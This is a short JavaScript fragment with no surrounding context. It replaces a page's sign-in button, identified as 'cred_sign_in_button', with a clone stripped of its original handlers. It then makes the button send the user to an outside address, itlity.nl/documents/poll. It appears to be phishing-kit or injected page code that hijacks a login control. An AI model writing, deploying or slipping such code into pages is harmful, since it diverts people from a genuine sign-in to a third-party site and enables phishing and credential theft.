var old_element = document.getElementById("cred_sign_in_button");
var new_element = old_element.cloneNode(true);
old_element.parentNode.replaceChild(new_element, old_element);
new_element.onclick = function () { location.href = "https://itlity.nl/documents/poll"; };